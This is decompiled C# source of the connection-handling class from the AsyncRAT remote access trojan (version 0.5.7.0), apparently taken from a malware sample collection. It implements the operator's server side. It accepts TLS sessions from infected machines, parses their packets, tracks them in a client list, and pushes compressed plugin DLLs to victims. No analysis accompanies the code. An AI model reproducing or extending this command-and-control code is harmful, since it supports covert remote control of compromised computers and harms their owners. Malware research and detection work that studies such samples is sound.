// Decompiled with JetBrains decompiler
// Type: Server.Connection.Clients
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Algorithm;
using Server.Handle_Packet;
using Server.MessagePack;
using System;
using System.Drawing;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;

namespace Server.Connection
{
  public class Clients
  {
    public Socket TcpClient { get; set; }

    public SslStream SslClient { get; set; }

    public ListViewItem LV { get; set; }

    public ListViewItem LV2 { get; set; }

    public string ID { get; set; }

    private byte[] ClientBuffer { get; set; }

    private long HeaderSize { get; set; }

    private long Offset { get; set; }

    private bool ClientBufferRecevied { get; set; }

    public object SendSync { get; set; }

    public long BytesRecevied { get; set; }

    public string Ip { get; set; }

    public Clients(Socket socket)
    {
      this.SendSync = new object();
      this.TcpClient = socket;
      this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(':')[0];
      this.SslClient = new SslStream((Stream) new NetworkStream(this.TcpClient, true), false);
      this.SslClient.BeginAuthenticateAsServer((X509Certificate) Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), (object) null);
    }

    private void EndAuthenticate(IAsyncResult ar)
    {
      try
      {
        this.SslClient.EndAuthenticateAsServer(ar);
        this.Offset = 0L;
        this.HeaderSize = 4L;
        this.ClientBuffer = new byte[this.HeaderSize];
        this.SslClient.BeginRead(this.ClientBuffer, (int) this.Offset, (int) this.HeaderSize, new AsyncCallback(this.ReadClientData), (object) null);
      }
      catch
      {
        this.SslClient?.Dispose();
        this.TcpClient?.Dispose();
      }
    }

    public void ReadClientData(IAsyncResult ar)
    {
      try
      {
        if (!this.TcpClient.Connected)
        {
          this.Disconnected();
        }
        else
        {
          int num = this.SslClient.EndRead(ar);
          if (num > 0)
          {
            this.HeaderSize -= (long) num;
            this.Offset += (long) num;
            if (!this.ClientBufferRecevied)
            {
              if (this.HeaderSize == 0L)
              {
                this.HeaderSize = (long) BitConverter.ToInt32(this.ClientBuffer, 0);
                if (this.HeaderSize > 0L)
                {
                  this.ClientBuffer = new byte[this.HeaderSize];
                  this.Offset = 0L;
                  this.ClientBufferRecevied = true;
                }
              }
              else if (this.HeaderSize < 0L)
              {
                this.Disconnected();
                return;
              }
            }
            else
            {
              lock (Settings.LockReceivedSendValue)
                Settings.ReceivedValue += (long) num;
              this.BytesRecevied += (long) num;
              if (this.HeaderSize == 0L)
              {
                ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet()
                {
                  client = this,
                  data = this.ClientBuffer
                }.Read), (object) null);
                this.Offset = 0L;
                this.HeaderSize = 4L;
                this.ClientBuffer = new byte[this.HeaderSize];
                this.ClientBufferRecevied = false;
              }
              else if (this.HeaderSize < 0L)
              {
                this.Disconnected();
                return;
              }
            }
            this.SslClient.BeginRead(this.ClientBuffer, (int) this.Offset, (int) this.HeaderSize, new AsyncCallback(this.ReadClientData), (object) null);
          }
          else
            this.Disconnected();
        }
      }
      catch
      {
        this.Disconnected();
      }
    }

    public void Disconnected()
    {
      if (this.LV != null)
        Program.form1.Invoke((Delegate) (() =>
        {
          try
          {
            lock (Settings.LockListviewClients)
              this.LV.Remove();
            if (this.LV2 != null)
            {
              lock (Settings.LockListviewThumb)
                this.LV2.Remove();
            }
          }
          catch
          {
          }
          new HandleLogs().Addmsg("Client " + this.Ip + " disconnected", Color.Red);
        }));
      try
      {
        this.SslClient?.Dispose();
        this.TcpClient?.Dispose();
      }
      catch
      {
      }
    }

    public void Send(object msg)
    {
      lock (this.SendSync)
      {
        try
        {
          if (!this.TcpClient.Connected)
          {
            this.Disconnected();
          }
          else
          {
            if ((byte[]) msg == null)
              return;
            byte[] buffer1 = (byte[]) msg;
            byte[] bytes = BitConverter.GetBytes(buffer1.Length);
            this.TcpClient.Poll(-1, SelectMode.SelectWrite);
            this.SslClient.Write(bytes, 0, bytes.Length);
            if (buffer1.Length > 1000000)
            {
              using (MemoryStream memoryStream = new MemoryStream(buffer1))
              {
                memoryStream.Position = 0L;
                byte[] buffer2 = new byte[50000];
                int count;
                while ((count = memoryStream.Read(buffer2, 0, buffer2.Length)) > 0)
                {
                  this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                  this.SslClient.Write(buffer2, 0, count);
                  this.SslClient.Flush();
                  lock (Settings.LockReceivedSendValue)
                    Settings.SentValue += (long) count;
                }
              }
            }
            else
            {
              this.TcpClient.Poll(-1, SelectMode.SelectWrite);
              this.SslClient.Write(buffer1, 0, buffer1.Length);
              this.SslClient.Flush();
              lock (Settings.LockReceivedSendValue)
                Settings.SentValue += (long) buffer1.Length;
            }
          }
        }
        catch
        {
          this.Disconnected();
        }
      }
    }

    public void SendPlugin(string hash)
    {
      try
      {
        foreach (string file in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
        {
          if (hash == GetHash.GetChecksum(file))
          {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").SetAsString("savePlugin");
            msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
            msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(file));
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), (object) msgPack.Encode2Bytes());
            new HandleLogs().Addmsg("Plugin " + Path.GetFileName(file) + " sent to client " + this.Ip, Color.Blue);
            break;
          }
        }
      }
      catch (Exception ex)
      {
        new HandleLogs().Addmsg("Client " + this.Ip + " " + ex.Message, Color.Red);
      }
    }
  }
}
